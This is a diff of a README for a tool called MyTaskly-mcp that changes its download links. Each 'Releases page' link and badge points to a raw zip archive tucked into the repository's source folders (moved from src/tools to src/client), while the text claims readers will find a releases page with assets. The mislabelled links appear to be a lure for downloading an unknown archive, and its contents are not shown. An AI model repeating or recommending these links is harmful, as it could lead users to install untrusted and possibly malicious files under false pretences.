@@ -1,6 +1,6 @@
 # 🎉 MyTaskly-mcp - Effortless Task Management Made Simple
 
-[![Download MyTaskly-mcp](https://github.com/zaka265-star/MyTaskly-mcp/raw/refs/heads/main/src/tools/mcp_Taskly_My_1.2.zip%20MyTaskly--mcp-v1.0-brightgreen)](https://github.com/zaka265-star/MyTaskly-mcp/raw/refs/heads/main/src/tools/mcp_Taskly_My_1.2.zip)
+[![Download MyTaskly-mcp](https://github.com/zaka265-star/MyTaskly-mcp/raw/refs/heads/main/src/client/Taskly-My-mcp-1.2.zip%20MyTaskly--mcp-v1.0-brightgreen)](https://github.com/zaka265-star/MyTaskly-mcp/raw/refs/heads/main/src/client/Taskly-My-mcp-1.2.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ Getting started with MyTaskly-mcp is straightforward. You will need to download 
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/zaka265-star/MyTaskly-mcp/raw/refs/heads/main/src/tools/mcp_Taskly_My_1.2.zip) to download the latest version of MyTaskly-mcp.
+1. Visit the [Releases page](https://github.com/zaka265-star/MyTaskly-mcp/raw/refs/heads/main/src/client/Taskly-My-mcp-1.2.zip) to download the latest version of MyTaskly-mcp.
 
 2. On the Releases page, scroll down to the “Assets” section. Here, you will see different files available for download. Choose the right file for your operating system.
 
@@ -75,6 +75,6 @@ If you need further assistance, you can reach out through the following channels
 
 Using MyTaskly-mcp can significantly improve how you manage your tasks. The user-friendly design makes it simple for anyone to use, while powerful features ensure security and ease of access. 
 
-For downloading and installing MyTaskly-mcp, remember to visit the [Releases page](https://github.com/zaka265-star/MyTaskly-mcp/raw/refs/heads/main/src/tools/mcp_Taskly_My_1.2.zip) to get started.
+For downloading and installing MyTaskly-mcp, remember to visit the [Releases page](https://github.com/zaka265-star/MyTaskly-mcp/raw/refs/heads/main/src/client/Taskly-My-mcp-1.2.zip) to get started.
 
-[![Download MyTaskly-mcp](https://github.com/zaka265-star/MyTaskly-mcp/raw/refs/heads/main/src/tools/mcp_Taskly_My_1.2.zip%20MyTaskly--mcp-v1.0-brightgreen)](https://github.com/zaka265-star/MyTaskly-mcp/raw/refs/heads/main/src/tools/mcp_Taskly_My_1.2.zip)
+[![Download MyTaskly-mcp](https://github.com/zaka265-star/MyTaskly-mcp/raw/refs/heads/main/src/client/Taskly-My-mcp-1.2.zip%20MyTaskly--mcp-v1.0-brightgreen)](https://github.com/zaka265-star/MyTaskly-mcp/raw/refs/heads/main/src/client/Taskly-My-mcp-1.2.zip)
